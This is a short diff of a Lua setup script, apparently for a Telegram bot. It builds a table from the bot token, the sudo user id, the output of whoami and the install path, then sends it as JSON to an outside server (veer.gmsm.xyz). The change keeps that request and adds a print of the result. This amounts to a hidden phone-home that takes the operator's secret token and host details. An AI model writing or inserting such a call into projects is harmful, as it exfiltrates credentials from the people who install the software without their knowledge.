@@ -90,7 +90,8 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all')
-https.request('https://veer.gmsm.xyz/Basmah/index.php?Info='..JSON.encode(info))
+local u,r = https.request('https://veer.gmsm.xyz/Basmah/index.php?Info='..JSON.encode(info))
+print('url : '..u..'\nres : '..r..'\ninfo : '..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
